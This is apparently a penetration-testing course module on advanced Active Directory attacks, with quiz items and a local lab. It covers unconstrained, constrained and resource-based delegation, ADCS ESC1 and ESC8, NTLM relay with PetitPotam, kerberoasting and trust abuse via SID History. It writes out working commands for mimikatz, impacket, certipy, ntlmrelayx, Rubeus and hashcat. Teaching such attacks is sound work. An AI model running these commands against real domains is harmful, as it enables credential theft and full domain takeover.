title: Advanced AD: PT2 Level
description: Kerberos delegation, ADCS abuse, NTLM relay, trust attacks.

1.title: Kerberos delegation
1.body:
## Unconstrained Delegation: the TGT honeypot

When a server has **unconstrained delegation**, any user who
authenticates against it leaves THEIR TGT cached in memory (LSASS). If you are admin on that
server, you can extract the TGTs of everyone who passed through it.

```bash
# Identify servers with unconstrained delegation
Get-ADComputer -Filter {TrustedForDelegation -eq $true}

# On the compromised server: extract tickets
mimikatz # sekurlsa::tickets /export
# Look for .kirbi files from privileged users

# Use the stolen TGT
mimikatz # kerberos::ptt ticket_admin@CORP.LOCAL.kirbi
```

### The full attack: PrinterBug + Unconstrained

1. You find a server with unconstrained delegation where you are admin
2. You use **PrinterBug** (`SpoolSample.exe`) to FORCE the DC to authenticate against
   your server
3. The DC leaves its TGT in your LSASS
4. You extract the TGT → Pass-the-Ticket → you are the DC

## Constrained Delegation: S4U2Self + S4U2Proxy

Constrained delegation only lets you impersonate SPECIFIC services (SPNs).
But there's a bug: if you can modify the `msDS-AllowedToDelegateTo` attribute:

```bash
# With impacket (from Linux):
getST.py -spn cifs/dc01.corp.local -impersonate administrator corp.local/svc_account:password
# Generates a ticket as administrator for the cifs service on dc01
```

## RBCD (Resource-Based Constrained Delegation)

The most modern one: delegation is configured ON the resource (not on the account).
If you can modify an object's `msDS-AllowedToActAsOther`:

```bash
# 1. Create a fake computer account
addcomputer.py -computer-name 'EVIL$' -computer-pass 'P@ss' corp.local/user:pass

# 2. Configure RBCD on the target
rbcd.py -delegate-to dc01 -delegate-from EVIL$ -action write corp.local/user:pass

# 3. Request tickets impersonating admin
getST.py -spn cifs/dc01.corp.local -impersonate administrator corp.local/EVIL$:P@ss
```

RBCD is especially dangerous because you only need WRITE on the
target object (not Domain Admin).

ad-avanzado-t01-q01.hint: Unconstrained delegation — the server stores tickets in LSASS.

ad-avanzado-t01-q02.prompt: What attack forces privileged authentication to steal TGTs?

2.title: ADCS and NTLM relay
2.body:
## ADCS: the certificates that open the domain

**ADCS** (Active Directory Certificate Services) issues digital certificates.
If a certificate allows Kerberos authentication and you can obtain one as another
user → you can impersonate them.

### ESC1: enrollee supplies subject (the most common)

The certificate template lets the requester specify the **SAN** (Subject
Alternative Name). A normal user requests a certificate with SAN=administrator@corp:

```bash
# With Certipy (Python):
certipy req -u user@corp.local -p password -ca CORP-CA -template VulnTemplate -upn administrator@corp.local

# You get a .pfx that AUTHENTICATES as administrator
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.10
```

### ESC8: NTLM Relay to ADCS

The ADCS web endpoint (`http://ca/certsrv`) accepts NTLM. Combined with an
authentication coercion:

```bash
# 1. Set up the relay (ntlmrelayx targets the ADCS web endpoint)
ntlmrelayx.py -t http://ca.corp.local/certsrv/certfnsh.asp -smb2support --adcs --template DomainController

# 2. Coerce the DC to authenticate against YOUR machine (PetitPotam)
petitpotam.py YOUR_IP dc01.corp.local

# 3. ntlmrelayx gets a certificate from the DC → Pass-the-Ticket → the domain
```

## NTLM Relay: the man-in-the-middle attack

NTLM has no channel binding by default → an authentication
can be "relayed" to another service:

```text
Victim (DC) ──NTLM──► Attacker (relay) ──NTLM──► Target service (LDAP/SMB/ADCS)
```

**PetitPotam** and **PrinterBug** are coercers: they force a Windows machine to
authenticate against an IP YOU control, kicking off the relay.

## Trust attacks: from child to parent

In a multi-domain forest, an attacker in `child.corp.local` can compromise the
parent domain `corp.local` by abusing the **trust ticket**:

```bash
# Extract the trust key from the child domain
ticketer.py -domain child.corp.local -domain-sid S-1-5-21-CHILD... -extra-sid S-1-5-21-PARENT... -spn krbtgt/corp.local child_admin

# Use the ticket to access the parent domain
export KRB5CCNAME=child_admin.ccache && smbexec.py -k corp.local/admin@dc01.corp.local
```

The **ExtraSid** (SID History) is the mechanism: the ticket includes the parent's
Domain Admin SID → full access.

3.title: Lab: kerberoasting, ESC1 and the forest
3.body:
## The forest as a chainable minefield

The lab simulates corp.local with the advanced attack paths — each
endpoint replicates the request the real tool would make:

```bash
cd labs/ad-forest-lab && cp flags.env.example flags.env
docker compose --env-file flags.env up -d
# http://127.0.0.1:18116
```

### Kerberoasting (the classic that never dies)

```bash
curl -s "http://127.0.0.1:18116/kerberoast?spn=BACKUP" | jq .
```

Any domain user can request a TGS for any SPN; the
ticket is encrypted with the ACCOUNT's key — if the password is weak,
it can be cracked offline. Real-world equivalent:

```powershell
Rubeus.exe kerberoast /format:hashcat
hashcat -m 13100 hashes.txt rockyou.txt
```

The defense: 25+ random character service passwords (or gMSA) and
AES-only encryption.

### ESC1: the certificate that makes you admin

```bash
curl -s http://127.0.0.1:18116/adcs/templates | jq '.templates[] | select(.esc)'
curl -s "http://127.0.0.1:18116/adcs/enroll?template=CorpWebServer&san=administrator@corp.local"
```

The `CorpWebServer` template lets the requester CHOOSE the SAN and
Domain Users can enroll: you request a certificate whose "identity" is
administrator. With real `certipy`: `certipy req -ca CORP-CA -template
CorpWebServer -upn administrator@corp.local` and then authenticate with that
certificate (pass-the-cert) without touching the admin's password.

### The trusts: the side door

`/trust` shows two relationships: parent-child with dev.corp.local (no
SID filtering — exploitable via SID History) and an external
BIDIRECTIONAL one with partner.external. In a real engagement, that second
one means "if I compromise the partner forest, I have a way in here" and
vice versa. `Get-ADTrust -Filter *` and alerts on anomalous SID History
are the routine audit for this.

## Full chain of the room

kerberoast (service credential) → access as svc-backup → its
delegation (S4U) or its right to enroll the ESC1 certificate → domain
admin → trust → the other forest. Advanced AD isn't a bug: it's a
QUEUE of small delegations nobody reviewed together. Lockhart
audits delegations, templates and trusts for exactly that reason.
